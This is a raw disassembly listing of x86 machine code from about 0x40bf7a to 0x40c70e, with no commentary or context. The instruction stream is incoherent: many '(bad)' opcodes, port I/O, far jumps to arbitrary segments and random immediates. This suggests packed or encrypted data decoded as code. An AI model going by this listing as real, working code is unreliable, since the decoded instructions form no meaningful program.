  40bf7a:	fadd   DWORD PTR [ecx+0x3785d8cb]
  40bf80:	cwde   
  40bf81:	icebp  
  40bf82:	mov    ebp,DWORD PTR [edx]
  40bf84:	pop    ebx
  40bf85:	(bad)  
  40bf86:	inc    ebx
  40bf87:	daa    
  40bf88:	in     al,dx
  40bf89:	pop    esp
  40bf8a:	dec    ebp
  40bf8b:	aaa    
  40bf8c:	jecxz  0x40bf12
  40bf8e:	inc    ecx
  40bf8f:	mov    al,0x5
  40bf91:	sahf   
  40bf92:	inc    edi
  40bf93:	jmp    0xed69:0x1ce9c09a
  40bf9a:	outs   dx,BYTE PTR ds:[esi]
  40bf9b:	mov    gs,WORD PTR [eax-0x48]
  40bf9e:	int3   
  40bf9f:	call   0x89d47f38
  40bfa4:	mov    edi,0x66b23939
  40bfa9:	int    0x32
  40bfab:	push   es
  40bfac:	loop   0x40bf5e
  40bfae:	loop   0x40bfe3
  40bfb0:	mov    ebx,0xc44de6b6
  40bfb5:	inc    ebx
  40bfb6:	mov    bl,BYTE PTR [esp+edi*4+0x35]
  40bfba:	sbb    bh,BYTE PTR [edx+0x61]
  40bfbd:	lds    eax,FWORD PTR [ecx]
  40bfbf:	jl     0x40bfc1
  40bfc1:	mov    es,WORD PTR [edi+eiz*4]
  40bfc4:	outs   dx,DWORD PTR ds:[esi]
  40bfc5:	lds    edx,FWORD PTR [edi+edx*1+0x73]
  40bfc9:	mov    ebp,0x3ef76450
  40bfce:	add    esp,DWORD PTR [ebp+edx*4+0x71]
  40bfd2:	push   ds
  40bfd3:	inc    esp
  40bfd4:	cwde   
  40bfd5:	outs   dx,DWORD PTR ds:[esi]
  40bfd6:	push   ebp
  40bfd7:	jmp    0x5b5f803
  40bfdc:	inc    edx
  40bfdd:	iret   
  40bfde:	imul   ebp,DWORD PTR es:[edi+0xc],0x647ed96b
  40bfe6:	js     0x40bf74
  40bfe8:	or     BYTE PTR [ebx+0x57],ah
  40bfeb:	repz aam 0x3f
  40bfee:	enter  0xe09f,0x13
  40bff2:	push   0xffffff95
  40bff4:	mov    BYTE PTR [edx+0x79a6cb16],ah
  40bffa:	add    bl,bl
  40bffc:	fdivr  DWORD PTR ds:0x8ea8a781
  40c002:	sub    al,0x95
  40c004:	mov    ds:0xd986bcd5,eax
  40c009:	jae    0x40c01f
  40c00b:	add    DWORD PTR [ebx],eax
  40c00d:	inc    edx
  40c00e:	push   0xffffffad
  40c010:	pop    ebx
  40c011:	lea    esi,ds:0x94a0303c
  40c017:	push   ss
  40c018:	pusha  
  40c019:	(bad)  
  40c01c:	dec    ebp
  40c01d:	out    dx,eax
  40c01e:	jge    0x40bfff
  40c020:	test   al,0x2
  40c022:	fstp   DWORD PTR [eax+ebp*4+0x18]
  40c026:	lods   eax,DWORD PTR ds:[esi]
  40c027:	fld    DWORD PTR [edx]
  40c029:	aas    
  40c02a:	pop    ds
  40c02b:	popf   
  40c02c:	leave  
  40c02d:	pop    ebx
  40c02e:	push   ebx
  40c02f:	inc    edx
  40c030:	add    al,0xac
  40c032:	aad    0x37
  40c034:	cld    
  40c035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c036:	mov    cl,0xbc
  40c038:	shl    edx,cl
  40c03a:	mov    bh,0x97
  40c03c:	add    esi,edx
  40c03e:	out    0xc7,al
  40c040:	dec    edx
  40c041:	sub    edx,esp
  40c043:	icebp  
  40c044:	ret    0xbfce
  40c047:	mov    ecx,0xf64c189d
  40c04c:	ins    BYTE PTR es:[edi],dx
  40c04d:	ins    DWORD PTR es:[edi],dx
  40c04e:	pop    ebx
  40c04f:	leave  
  40c050:	aad    0xac
  40c052:	or     al,cl
  40c054:	loop   0x40c0c8
  40c056:	out    0x2d,al
  40c058:	add    al,0x72
  40c05a:	idiv   DWORD PTR [ebp-0x2a5ce1c6]
  40c060:	shr    BYTE PTR [eax-0x4f],cl
  40c063:	adc    eax,0x94bd2625
  40c068:	inc    ebp
  40c069:	mov    ds,edi
  40c06b:	xor    eax,0x83b09a4
  40c070:	call   0x991f:0xea1f45e
  40c077:	add    esp,DWORD PTR ss:[esi]
  40c07a:	add    esp,DWORD PTR [esi]
  40c07c:	mov    cl,0xf7
  40c07e:	ins    BYTE PTR es:[edi],dx
  40c07f:	pushf  
  40c080:	gs push ebp
  40c082:	dec    edx
  40c083:	mov    esp,0x20668bca
  40c088:	jno    0x40c025
  40c08a:	mov    bl,0x8c
  40c08c:	cs icebp 
  40c08e:	and    ebx,ecx
  40c090:	mov    BYTE PTR [ecx-0x5c],0x94
  40c094:	mov    DWORD PTR [edi+0x51],esp
  40c097:	cdq    
  40c098:	add    BYTE PTR [ebp-0x4604399],dl
  40c09e:	shl    BYTE PTR [esp+edx*2+0x35e89b16],1
  40c0a5:	test   BYTE PTR [edx],bl
  40c0a7:	jo     0x40c0e7
  40c0a9:	ret    0xd308
  40c0ac:	shl    BYTE PTR [edx-0x5c],cl
  40c0af:	and    BYTE PTR [eax+0x72],ch
  40c0b2:	pop    es
  40c0b3:	fcomp  DWORD PTR [edx-0x301570cc]
  40c0b9:	xor    esi,edi
  40c0bb:	jnp    0x40c0e3
  40c0bd:	mov    DWORD PTR [esi+eax*8],esp
  40c0c0:	mov    ds:0x70c6952e,al
  40c0c5:	xlat   BYTE PTR ds:[ebx]
  40c0c6:	cmp    eax,0x593d003c
  40c0cb:	test   al,0xaf
  40c0cd:	adc    ecx,DWORD PTR [ebx+0x57]
  40c0d0:	mov    esp,0xc264b73e
  40c0d5:	scas   al,BYTE PTR es:[edi]
  40c0d6:	sbb    eax,0x590aa81
  40c0db:	js     0x40c0b4
  40c0dd:	les    ecx,FWORD PTR [ecx+eiz*8+0x158b4e4d]
  40c0e4:	mov    ch,0x1
  40c0e6:	icebp  
  40c0e7:	xor    eax,0xeca96b90
  40c0ec:	mov    ds:0x3ce7f887,eax
  40c0f1:	cmp    al,0x15
  40c0f3:	popf   
  40c0f4:	je     0x40c10a
  40c0f6:	mov    eax,ds:0xf99a4004
  40c0fb:	repz sbb BYTE PTR [eax-0x463190a5],0xa6
  40c103:	stos   BYTE PTR es:[edi],al
  40c104:	mov    WORD PTR [esi+0x52654d33],cs
  40c10a:	sub    eax,0x9bd19b6c
  40c10f:	into   
  40c110:	pop    ss
  40c111:	push   ebp
  40c112:	xchg   DWORD PTR [edx],edx
  40c114:	inc    esp
  40c115:	xor    al,0xc3
  40c117:	stc    
  40c118:	fcmovu st,st(1)
  40c11a:	jne    0x40c11b
  40c11c:	dec    esp
  40c11d:	retf   0x7967
  40c120:	adc    eax,0x3bf85e50
  40c125:	inc    ebx
  40c126:	push   ss
  40c127:	sub    edx,DWORD PTR [eax-0x42]
  40c12a:	aam    0x5a
  40c12c:	fmul   QWORD PTR [eax+ebp*8+0x46657d38]
  40c133:	xchg   BYTE PTR [ebp+0x3c290e01],ch
  40c139:	or     eax,0x837f4072
  40c13e:	cmp    BYTE PTR [edx-0x2b147294],bl
  40c144:	call   0x1c66fa7b
  40c149:	mov    edi,0x543a249c
  40c14e:	ret    
  40c14f:	fimul  WORD PTR [esi-0x693058c3]
  40c155:	aas    
  40c156:	mov    esp,0x82776eda
  40c15b:	mov    ds:0x4fe1a382,al
  40c160:	sub    eax,0xaa2e0604
  40c165:	jnp    0x40c12f
  40c167:	stos   BYTE PTR es:[edi],al
  40c168:	in     eax,dx
  40c169:	or     BYTE PTR [esi],0xc6
  40c16c:	xchg   edx,eax
  40c16d:	push   edi
  40c16e:	data16 out dx,al
  40c170:	pusha  
  40c171:	mov    es:0x65dca8fa,eax
  40c177:	pop    esi
  40c178:	cmc    
  40c179:	pop    DWORD PTR [edx+0x6e7dfd1e]
  40c17f:	or     esp,DWORD PTR [edi*1+0x4519b6ad]
  40c186:	out    dx,al
  40c187:	adc    BYTE PTR ds:0xcc96a289,dl
  40c18d:	mov    esi,0x274e12e0
  40c192:	in     eax,0xd6
  40c194:	add    eax,0x895acb36
  40c199:	sub    eax,0x5d60e43d
  40c19e:	xlat   BYTE PTR ds:[ebx]
  40c19f:	movlps QWORD PTR [eax],xmm6
  40c1a2:	dec    eax
  40c1a3:	int    0x13
  40c1a5:	ja     0x40c1b7
  40c1a7:	xchg   DWORD PTR [eax],eax
  40c1a9:	loop   0x40c156
  40c1ab:	cmc    
  40c1ac:	lahf   
  40c1ad:	sub    ebp,edi
  40c1af:	lock push eax
  40c1b1:	scas   al,BYTE PTR es:[edi]
  40c1b2:	and    eax,0x6447fe32
  40c1b7:	arpl   bp,di
  40c1b9:	lahf   
  40c1ba:	aaa    
  40c1bb:	imul   ebp,DWORD PTR [ebp+0x46],0x62
  40c1bf:	jmp    0x3480:0x586e956
  40c1c6:	pop    es
  40c1c7:	int3   
  40c1c8:	ja     0x40c1bb
  40c1ca:	mov    ch,BYTE PTR [ecx*1-0x5e2471f]
  40c1d1:	cmp    al,0xd8
  40c1d3:	retf   
  40c1d4:	sbb    eax,0xb3f376bc
  40c1d9:	xchg   ecx,eax
  40c1da:	out    0xdb,eax
  40c1dc:	mov    esp,0x899f4b3e
  40c1e1:	mov    ds:0xcf659b93,al
  40c1e6:	inc    edx
  40c1e7:	push   cs
  40c1e8:	xor    cl,BYTE PTR [edx-0x60]
  40c1eb:	pop    ebp
  40c1ec:	test   DWORD PTR [edi+eax*8+0x16b2cf08],eax
  40c1f3:	push   esp
  40c1f4:	pop    ebp
  40c1f5:	jno    0x40c21e
  40c1f7:	call   0xbd77:0x84004fd5
  40c1fe:	xchg   esi,eax
  40c1ff:	out    0xc7,eax
  40c201:	out    dx,al
  40c202:	imul   esp,esp,0x4866b7e
  40c208:	in     eax,dx
  40c209:	sbb    BYTE PTR [edi-0x75],ah
  40c20c:	mov    al,ds:0x3944f7f
  40c211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c212:	lock addr16 cli 
  40c215:	call   0x35a1:0xcdec8065
  40c21c:	inc    esp
  40c21d:	inc    ebx
  40c21e:	push   es
  40c21f:	pop    eax
  40c220:	cmp    al,0xab
  40c222:	ss fs push edi
  40c225:	js     0x40c26b
  40c227:	aad    0x77
  40c229:	mov    ah,0x9a
  40c22b:	mov    bl,BYTE PTR [edx+0x2f]
  40c22e:	xchg   esp,eax
  40c22f:	sub    al,0xe4
  40c231:	jbe    0x40c1dc
  40c233:	div    DWORD PTR [esi-0x29170476]
  40c239:	inc    esi
  40c23a:	stos   DWORD PTR es:[edi],eax
  40c23b:	inc    ebx
  40c23c:	ds jl  0x40c293
  40c23f:	add    al,0x28
  40c241:	pop    esp
  40c242:	pop    ebp
  40c243:	jno    0x40c258
  40c245:	les    esi,FWORD PTR [ecx+edx*4-0x42]
  40c249:	sti    
  40c24a:	aaa    
  40c24b:	xchg   ebp,eax
  40c24c:	scas   eax,DWORD PTR es:[edi]
  40c24d:	xchg   ebp,eax
  40c24e:	dec    ecx
  40c24f:	(bad)  [edx+ecx*4-0x27]
  40c253:	stos   DWORD PTR es:[edi],eax
  40c254:	inc    ecx
  40c255:	sar    BYTE PTR [ebp+0x5444b705],0x34
  40c25c:	push   0x559a7df1
  40c261:	lock cdq 
  40c263:	dec    DWORD PTR [ebx]
  40c265:	jg     0x40c1f0
  40c267:	jnp    0x40c29f
  40c269:	sahf   
  40c26a:	inc    edx
  40c26b:	in     al,dx
  40c26c:	inc    ecx
  40c26d:	pop    es
  40c26e:	add    eax,0x3146f870
  40c273:	dec    eax
  40c274:	push   cs
  40c275:	fwait
  40c276:	pop    eax
  40c277:	int    0x7e
  40c279:	push   edx
  40c27a:	cmp    dl,bl
  40c27c:	xor    DWORD PTR cs:[ebp-0x765cfdbe],edi
  40c283:	fsubp  st(3),st
  40c285:	cmp    al,0x89
  40c287:	fcomp  st(0)
  40c289:	(bad)  
  40c28a:	pop    esi
  40c28b:	push   ds
  40c28c:	inc    ecx
  40c28d:	inc    esp
  40c28e:	dec    esp
  40c28f:	and    al,0x9f
  40c291:	jge    0x40c2c2
  40c293:	jg     0x40c28b
  40c295:	add    eax,0x27ad0a44
  40c29a:	push   ds
  40c29b:	jp     0x40c2a8
  40c29d:	fsubr  QWORD PTR [edx-0x36ce83eb]
  40c2a3:	mov    bh,0x73
  40c2a5:	pop    edi
  40c2a6:	pushf  
  40c2a7:	js     0x40c2e0
  40c2a9:	mov    BYTE PTR [eax+0x1c2166da],cl
  40c2af:	or     BYTE PTR [ebp-0x69],0xcf
  40c2b3:	push   0xb7b33e33
  40c2b8:	sahf   
  40c2b9:	xor    al,0xdb
  40c2bb:	call   0xca0a:0xcbce842a
  40c2c2:	call   0xb496cb22
  40c2c7:	das    
  40c2c8:	ins    DWORD PTR es:[edi],dx
  40c2c9:	adc    edi,ebx
  40c2cb:	in     eax,dx
  40c2cc:	jmp    0x1c76:0xfaa76b91
  40c2d3:	int3   
  40c2d4:	test   BYTE PTR [ebx-0x10231d89],cl
  40c2da:	test   al,0x20
  40c2dc:	pop    DWORD PTR [esi-0x3c]
  40c2df:	add    ch,dh
  40c2e1:	push   ecx
  40c2e2:	cmc    
  40c2e3:	(bad)  
  40c2e5:	rcl    BYTE PTR [edi+0x3e],0xd3
  40c2e9:	std    
  40c2ea:	inc    ecx
  40c2eb:	shr    bl,1
  40c2ed:	xchg   edx,eax
  40c2ee:	ins    DWORD PTR es:[edi],dx
  40c2ef:	jp     0x40c368
  40c2f1:	fdivr  DWORD PTR [ebx]
  40c2f3:	pop    ebp
  40c2f4:	pusha  
  40c2f5:	jae    0x40c333
  40c2f7:	pop    ds
  40c2f8:	jle    0x40c340
  40c2fa:	out    dx,al
  40c2fb:	call   0x71e6:0x7b7a3941
  40c302:	out    dx,eax
  40c303:	aad    0x65
  40c305:	int3   
  40c306:	mov    ecx,0xee41485a
  40c30b:	xchg   edx,eax
  40c30c:	aad    0x1e
  40c30e:	(bad)  
  40c30f:	es sbb eax,0x5fd806de
  40c315:	imul   ebp,DWORD PTR ds:[ecx+0xc],0x7f5031f9
  40c31d:	dec    edi
  40c31e:	in     eax,0xc0
  40c320:	test   ebx,0xd4350a2e
  40c326:	fucomp st(3)
  40c328:	dec    eax
  40c329:	ds aaa 
  40c32b:	and    ah,al
  40c32d:	shr    dl,0xd0
  40c330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c331:	imul   ebp,DWORD PTR [esi+0x40],0x89cc6df4
  40c338:	jb     0x40c301
  40c33a:	jmp    0x5a7b12ce
  40c33f:	jp     0x40c2ed
  40c341:	out    dx,al
  40c342:	leave  
  40c343:	stos   BYTE PTR es:[edi],al
  40c344:	push   ebx
  40c345:	pop    eax
  40c346:	cmp    edx,DWORD PTR [ecx]
  40c348:	les    edx,FWORD PTR [ebp+0x48]
  40c34b:	hlt    
  40c34c:	pushf  
  40c34d:	inc    eax
  40c34e:	xchg   DWORD PTR [edx+ebp*1+0xab5c8db],esp
  40c355:	imul   edx,edx,0x4ab5c1cc
  40c35b:	push   eax
  40c35c:	aaa    
  40c35d:	call   0x8c61:0xc80bd676
  40c364:	push   0x192c9706
  40c369:	mov    ebx,0x8cb15497
  40c36e:	inc    ebx
  40c36f:	ss xchg esp,eax
  40c371:	sub    eax,0xf6ac310e
  40c376:	mov    BYTE PTR [esi+0x53],cl
  40c379:	icebp  
  40c37a:	add    al,dh
  40c37c:	add    BYTE PTR [ecx+eax*8],cl
  40c37f:	mov    bh,0x93
  40c381:	or     BYTE PTR [eax],0xa5
  40c384:	retf   
  40c385:	mov    ebp,0x88fd20c5
  40c38a:	scas   al,BYTE PTR es:[edi]
  40c38b:	xchg   DWORD PTR [ebx],edi
  40c38d:	shl    BYTE PTR [esi],0xde
  40c390:	gs inc edx
  40c392:	in     al,dx
  40c393:	fbstp  TBYTE PTR [ebp-0x64]
  40c396:	cdq    
  40c397:	ins    BYTE PTR es:[edi],dx
  40c398:	mov    ebx,0x53d8c404
  40c39d:	xor    ch,dl
  40c39f:	cmp    BYTE PTR [ebx+ebp*2],ch
  40c3a2:	push   esp
  40c3a3:	aas    
  40c3a4:	dec    esi
  40c3a5:	stos   BYTE PTR es:[edi],al
  40c3a6:	repnz add edx,0xffffffc5
  40c3aa:	mov    esp,0xf2427887
  40c3af:	ja     0x3fbe51c1
  40c3b5:	jecxz  0x40c3d5
  40c3b7:	cli    
  40c3b8:	mov    dl,0xe0
  40c3ba:	mov    al,BYTE PTR [esi+0x17ffc9a4]
  40c3c0:	sub    al,0xe8
  40c3c3:	sub    eax,0x1aca751a
  40c3c8:	gs add al,0x9d
  40c3cb:	xchg   edi,eax
  40c3cc:	or     eax,0x1baffe23
  40c3d1:	fadd   st,st(7)
  40c3d3:	pop    ebp
  40c3d4:	ins    BYTE PTR es:[edi],dx
  40c3d5:	jns    0x40c36f
  40c3d7:	or     ch,cl
  40c3d9:	fisttp QWORD PTR [ebx]
  40c3db:	xor    ecx,DWORD PTR [esi-0x481db5db]
  40c3e1:	push   cs
  40c3e2:	lock data16 fnstsw WORD PTR [esi]
  40c3e6:	leave  
  40c3e7:	inc    ecx
  40c3e8:	cli    
  40c3e9:	(bad)  
  40c3ea:	xchg   esi,eax
  40c3eb:	jge    0x40c3e9
  40c3ed:	xchg   edx,eax
  40c3ee:	dec    ebp
  40c3ef:	push   esp
  40c3f0:	fcom   QWORD PTR [ebp+0x5d3bc7ec]
  40c3f6:	popa   
  40c3f7:	mov    dl,BYTE PTR [edi]
  40c3f9:	pop    ebp
  40c3fa:	int    0xbf
  40c3fc:	sbb    eax,0xcb297c58
  40c401:	mov    dl,0xa0
  40c403:	(bad)  
  40c405:	retf   0x195
  40c408:	frstor [ecx-0x10]
  40c40b:	loope  0x40c394
  40c40d:	jne    0x40c3c6
  40c40f:	ds inc esp
  40c411:	xchg   ecx,eax
  40c412:	icebp  
  40c413:	jnp    0x40c428
  40c415:	lds    eax,FWORD PTR [eax]
  40c417:	hlt    
  40c418:	loopne 0x40c40c
  40c41a:	xchg   edx,eax
  40c41b:	hlt    
  40c41c:	outs   dx,BYTE PTR ds:[esi]
  40c41d:	test   DWORD PTR [eax+0x17],esi
  40c420:	adc    eax,0x88615899
  40c425:	push   0xffffffb7
  40c427:	xchg   cl,al
  40c429:	test   DWORD PTR [eax+0x65],ebx
  40c42c:	das    
  40c42d:	das    
  40c42e:	adc    esp,DWORD PTR [edx]
  40c430:	pop    edi
  40c431:	repz and DWORD PTR [ebp-0x4e],ebx
  40c435:	fnsave [esi-0x7]
  40c438:	pop    eax
  40c439:	ret    
  40c43a:	pop    edi
  40c43b:	mov    ecx,0x73cbaeec
  40c440:	repz inc esi
  40c442:	inc    edx
  40c443:	cmp    ebp,DWORD PTR [ebp-0x50]
  40c446:	xlat   BYTE PTR ds:[ebx]
  40c447:	test   DWORD PTR [ebx-0x1fda8734],esi
  40c44d:	outs   dx,BYTE PTR ds:[esi]
  40c44e:	inc    ecx
  40c44f:	je     0x40c46c
  40c451:	pop    es
  40c452:	adc    eax,0xeebd09ec
  40c457:	add    al,0x89
  40c459:	pusha  
  40c45a:	adc    eax,0xc59cbaca
  40c45f:	push   0x1465a237
  40c464:	jns    0x40c421
  40c466:	test   al,0xab
  40c468:	jb     0x40c42e
  40c46a:	add    BYTE PTR [ebx+0x2e],cl
  40c46d:	fwait
  40c46e:	das    
  40c46f:	les    esi,FWORD PTR [edi]
  40c471:	jecxz  0x40c49b
  40c473:	sbb    DWORD PTR [edx-0xf],ebp
  40c476:	mov    cl,0xff
  40c478:	jl     0x40c494
  40c47a:	adc    edi,DWORD PTR [esi-0x29]
  40c47d:	inc    edx
  40c47e:	(bad)  
  40c47f:	(bad)  
  40c480:	iret   
  40c481:	imul   edi,DWORD PTR [ebx-0x4803a63f],0xaac9d729
  40c48b:	cmp    BYTE PTR [esi],cl
  40c48d:	inc    ebx
  40c48e:	inc    eax
  40c48f:	fs call 0xc712:0x4a70dd6f
  40c497:	add    ch,BYTE PTR [ecx]
  40c499:	ss (bad) 
  40c49b:	xchg   edi,eax
  40c49c:	out    dx,eax
  40c49d:	nop
  40c49e:	sbb    BYTE PTR [ebx+eax*8],cl
  40c4a1:	sti    
  40c4a2:	push   ds
  40c4a3:	push   ebp
  40c4a4:	popa   
  40c4a5:	xlat   BYTE PTR ds:[ebx]
  40c4a6:	jg     0x40c521
  40c4a8:	jnp    0x40c4d8
  40c4aa:	(bad)  
  40c4ab:	out    dx,eax
  40c4ac:	jge    0x40c463
  40c4ae:	xor    DWORD PTR [esi+0x26],edx
  40c4b1:	mov    bl,0xf7
  40c4b3:	popa   
  40c4b4:	outs   dx,BYTE PTR ds:[esi]
  40c4b5:	imul   ebp,DWORD PTR [eax+0x22],0x67
  40c4b9:	fsub   QWORD PTR [edx+0x6b093135]
  40c4bf:	pop    ss
  40c4c0:	add    ebx,DWORD PTR [edx-0x5c]
  40c4c3:	or     DWORD PTR [ebp+0x69],edi
  40c4c6:	push   0x2fcbcb0d
  40c4cb:	inc    ebx
  40c4cc:	adc    DWORD PTR [ecx-0x7baf974],ebp
  40c4d2:	imul   edi,edi,0x827ebd48
  40c4d8:	mov    bl,0x55
  40c4da:	pop    eax
  40c4db:	sti    
  40c4dc:	es xchg esp,eax
  40c4de:	int    0xf1
  40c4e0:	add    ah,BYTE PTR [esi+edi*4+0x7a]
  40c4e4:	inc    eax
  40c4e5:	adc    al,0x8d
  40c4e7:	dec    ecx
  40c4e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4e9:	or     eax,0x357e4f02
  40c4ee:	sti    
  40c4ef:	xor    DWORD PTR [ecx-0x7416a629],0xffffffd2
  40c4f6:	mov    esi,0x224f7b2e
  40c4fb:	add    eax,0x9e7e846c
  40c500:	dec    edx
  40c501:	jl     0x40c4fc
  40c503:	shl    BYTE PTR [ebp+0xe],1
  40c506:	rcl    DWORD PTR ds:0x4217c3a2,cl
  40c50c:	jne    0x40c4a1
  40c50e:	test   al,0x18
  40c510:	sbb    eax,0xd9bf3ab6
  40c515:	and    edx,DWORD PTR [esi+0x2a1e95d4]
  40c51b:	mov    dl,0xc0
  40c51d:	sub    al,BYTE PTR [ebx+0x38]
  40c520:	mov    ah,0x46
  40c522:	ret    0x6dfd
  40c525:	repnz and cl,BYTE PTR [esi+ecx*4+0xb]
  40c52a:	mov    ?,esp
  40c52c:	test   al,0xc
  40c52e:	cdq    
  40c52f:	dec    ecx
  40c530:	(bad)  
  40c531:	out    dx,eax
  40c532:	mov    dh,0xbc
  40c534:	or     ecx,DWORD PTR [eax]
  40c536:	inc    edi
  40c537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c538:	inc    ecx
  40c539:	push   cs
  40c53a:	cdq    
  40c53b:	push   ecx
  40c53c:	dec    edx
  40c53d:	jmp    0xd4998510
  40c542:	mov    ecx,esi
  40c544:	mov    ch,0x36
  40c546:	xor    esi,DWORD PTR [ecx-0x6df5ca23]
  40c54c:	mov    di,0x80c4
  40c550:	ins    BYTE PTR es:[edi],dx
  40c551:	mov    bh,bl
  40c553:	mov    ds:0xe6a03c1,al
  40c558:	mov    ds:0x53333298,eax
  40c55d:	and    al,0x66
  40c55f:	push   edx
  40c560:	or     ecx,DWORD PTR [ecx]
  40c562:	mov    ecx,DWORD PTR [ecx+0x5a]
  40c565:	and    dh,0xe8
  40c568:	jp     0x40c58e
  40c56a:	mov    fs,WORD PTR [esi+0x36]
  40c56d:	or     al,0x24
  40c56f:	dec    esp
  40c570:	pop    ds
  40c571:	xor    DWORD PTR [eax],edx
  40c573:	addr16 (bad) 
  40c575:	jp     0x40c4fb
  40c577:	fwait
  40c578:	sbb    BYTE PTR ss:[edi],bl
  40c57b:	inc    esp
  40c57c:	mov    ds:0x28366a8a,al
  40c581:	cdq    
  40c582:	inc    edx
  40c583:	mov    eax,ds:0xabeaa6b0
  40c588:	push   ds
  40c589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c58a:	das    
  40c58b:	leave  
  40c58c:	dec    ebp
  40c58d:	out    0x89,eax
  40c58f:	pop    eax
  40c590:	(bad)  
  40c591:	popf   
  40c592:	sbb    al,BYTE PTR [edi-0x35]
  40c595:	pop    esp
  40c596:	jns    0x40c56a
  40c598:	(bad)
  40c59c:	xchg   DWORD PTR [eax],esp
  40c59e:	dec    edx
  40c59f:	sbb    eax,DWORD PTR ds:0x41d4418e
  40c5a5:	imul   esp,DWORD PTR [edx-0x70c670fe],0xa52ae499
  40c5af:	jg     0x40c5f0
  40c5b1:	neg    DWORD PTR ds:0x914cbae2
  40c5b7:	in     al,0x2e
  40c5b9:	inc    ebp
  40c5ba:	loope  0x40c5a0
  40c5bc:	or     al,0xb3
  40c5be:	popa   
  40c5bf:	std    
  40c5c0:	mov    edi,0xd41a3d2c
  40c5c5:	or     DWORD PTR [eax+0xae4d120],ecx
  40c5cb:	inc    esi
  40c5cc:	ror    ch,1
  40c5ce:	sbb    edx,DWORD PTR [ebx+0x1b3dd902]
  40c5d4:	cmp    eax,0xfb97742d
  40c5d9:	addr16 inc ecx
  40c5db:	clc    
  40c5dc:	icebp  
  40c5dd:	lods   al,BYTE PTR ds:[esi]
  40c5de:	test   DWORD PTR [esi],0x971e5328
  40c5e4:	loopne 0x40c636
  40c5e6:	dec    esi
  40c5e7:	or     BYTE PTR [eax],bl
  40c5e9:	div    DWORD PTR [ecx+eiz*8-0x5f]
  40c5ed:	xor    ah,BYTE PTR [ecx-0x77]
  40c5f0:	arpl   dx,cx
  40c5f2:	xchg   edx,ebx
  40c5f4:	mov    dh,0xbf
  40c5f6:	cmp    dh,BYTE PTR [ebx]
  40c5f8:	jb     0x40c5db
  40c5fa:	adc    eax,0xfe0030f3
  40c5ff:	sbb    eax,0x7ef5d9cf
  40c604:	sub    BYTE PTR es:[edi],dl
  40c607:	mov    dh,0x8
  40c609:	test   DWORD PTR [ecx],esp
  40c60b:	mov    esi,0x2dd969ea
  40c610:	add    eax,0x2eb52d24
  40c615:	jmp    0x23bf0bec
  40c61a:	leave  
  40c61b:	adc    BYTE PTR [esi],ah
  40c61d:	aam    0xc0
  40c61f:	je     0x40c5d8
  40c621:	(bad)  
  40c622:	out    dx,eax
  40c623:	or     al,0x7a
  40c625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c626:	outs   dx,DWORD PTR ds:[esi]
  40c627:	pop    ebp
  40c628:	mov    eax,0x4fae5d11
  40c62d:	xchg   edi,eax
  40c62e:	mov    ebx,0x290b8de6
  40c633:	sbb    DWORD PTR [ebx-0x74],ecx
  40c636:	jo     0x40c602
  40c638:	dec    esp
  40c639:	or     al,0x61
  40c63b:	mov    al,0x1a
  40c63d:	mov    ds:0x37420c13,al
  40c642:	fs xchg edx,eax
  40c644:	shr    BYTE PTR [eax+edi*1-0x1177aaa6],1
  40c64b:	and    eax,0xff74c5f0
  40c650:	mov    bl,0xf5
  40c652:	or     BYTE PTR [ebx],dl
  40c654:	xor    eax,0x37cbada6
  40c659:	mov    ecx,0x27888683
  40c65e:	cwde   
  40c65f:	pusha  
  40c660:	ficomp WORD PTR [ebp+0x7024da4]
  40c666:	sar    DWORD PTR [edx+0x1],0xae
  40c66a:	into   
  40c66b:	into   
  40c66c:	lods   al,BYTE PTR ds:[esi]
  40c66d:	and    DWORD PTR [edi-0x43e4623e],0x18
  40c674:	sar    eax,1
  40c676:	ror    DWORD PTR [eax-0x48],cl
  40c679:	test   al,0x5a
  40c67b:	cs or  al,0xb4
  40c67e:	scas   al,BYTE PTR es:[edi]
  40c67f:	pop    es
  40c680:	add    ah,dh
  40c682:	pop    edi
  40c683:	dec    esp
  40c684:	mov    ebp,DWORD PTR [ebp-0x69a4f7f7]
  40c68a:	fild   WORD PTR [edx+0x3b402903]
  40c690:	dec    ebp
  40c691:	inc    ecx
  40c692:	ins    BYTE PTR es:[edi],dx
  40c693:	repnz int 0x42
  40c696:	ds pushf 
  40c698:	and    eax,0xcadd5c9a
  40c69d:	push   ss
  40c69e:	shl    BYTE PTR [esi-0x61],cl
  40c6a1:	imul   DWORD PTR [ebp+0x47]
  40c6a4:	sub    BYTE PTR [esi],al
  40c6a6:	ss popa 
  40c6a8:	add    al,0x29
  40c6aa:	bound  esp,QWORD PTR [ebx-0x20c406bc]
  40c6b0:	(bad)  
  40c6b1:	pop    ds
  40c6b2:	nop    DWORD PTR [edx-0x15ba1384]
  40c6b9:	mov    dl,0xde
  40c6bb:	jae    0x40c64d
  40c6bd:	out    dx,eax
  40c6be:	sbb    ebx,DWORD PTR [eax+0x3c]
  40c6c1:	sbb    edi,DWORD PTR [edx+ecx*4]
  40c6c4:	xor    al,0xe5
  40c6c6:	cwde   
  40c6c7:	sub    dl,bh
  40c6c9:	sub    eax,0xc2df40af
  40c6ce:	lds    esi,FWORD PTR [eax-0x3ddab412]
  40c6d4:	jmp    DWORD PTR [ebp+0x2b]
  40c6d7:	(bad)
  40c6db:	loope  0x40c677
  40c6dd:	push   edi
  40c6de:	push   esi
  40c6df:	scas   al,BYTE PTR es:[edi]
  40c6e0:	and    eax,0x91ed7f3c
  40c6e5:	ins    BYTE PTR es:[edi],dx
  40c6e6:	mov    bl,0xd9
  40c6e8:	xor    eax,0x5b0e223a
  40c6ed:	pop    ecx
  40c6ee:	add    DWORD PTR [ecx+ecx*4-0x2dfc3576],ebp
  40c6f5:	mov    bh,0x12
  40c6f7:	test   DWORD PTR [eax+esi*1],ebp
  40c6fa:	nop
  40c6fb:	icebp  
  40c6fc:	imul   ecx,DWORD PTR [esp+ebx*4]
  40c700:	mov    ecx,0xb0a96bb0
  40c705:	jne    0x40c781
  40c707:	jge    0x40c6f8
  40c709:	loop   0x40c782
  40c70b:	and    BYTE PTR [eax],ch
  40c70d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c70e:	jecxz  0x40c6eb
